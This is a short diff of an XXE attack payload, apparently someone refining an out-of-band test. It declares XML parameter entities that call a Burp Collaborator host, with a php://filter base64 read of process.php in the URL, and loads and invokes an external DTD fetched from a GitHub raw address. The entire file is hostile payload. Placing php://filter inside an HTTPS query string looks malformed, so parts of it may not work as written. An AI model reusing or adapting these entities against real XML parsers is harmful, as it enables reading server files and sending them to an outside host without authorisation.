@@ -1,2 +1,3 @@
-<!ENTITY % file SYSTEM "https://zz.1celh9920n7vfh7lwr5y5v3uqlwgk5.burpcollaborator.net?php://filter/convert.base64-encode/resource=process.php">
-<!ENTITY % files SYSTEM "https://zx.1celh9920n7vfh7lwr5y5v3uqlwgk5.burpcollaborator.net?php://filter/convert.base64-encode/resource=process.php">
+<!ENTITY % file SYSTEM "https://zz2.1celh9920n7vfh7lwr5y5v3uqlwgk5.burpcollaborator.net?php://filter/convert.base64-encode/resource=process.php">
+<!ENTITY % calls SYSTEM "https://raw.githubusercontent.com/vsr2390/test.com/main/test1.dtd"> 
+%calls;
